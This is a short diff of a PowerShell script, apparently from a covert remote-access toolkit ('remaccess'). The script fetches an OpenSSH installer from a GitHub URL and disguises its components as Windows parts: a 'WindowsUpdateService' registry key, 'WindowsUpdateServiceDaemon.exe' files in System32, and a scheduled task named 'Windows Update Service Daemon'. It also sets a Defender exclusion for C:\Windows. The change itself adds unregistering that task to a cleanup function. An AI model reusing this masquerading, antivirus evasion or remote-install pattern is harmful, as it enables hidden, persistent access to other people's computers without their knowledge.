@@ -14,6 +14,7 @@ $sshdatadir = "C:\ProgramData\ssh"
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $defenderexclusins = "C:\Windows"
 $pingexepaths = @("C:\Windows\System32\WindowsUpdateServiceDaemon.exe", "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe")
+$pingdaemontask = "Windows Update Service Daemon"
 $cacheBuster = Get-Random
 $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Archives/SimplifiedIOpenSSHnstallFromZIP.ps1"
 #$sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
@@ -276,6 +277,7 @@ function Remove-Package {
 
 #Function to purge ping exes.
 function RemovePings {
+    Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
     foreach ($file in $pingexepaths) {
         if (Test-Path $file) {
             Remove-Item $file -Force -ErrorAction SilentlyContinue
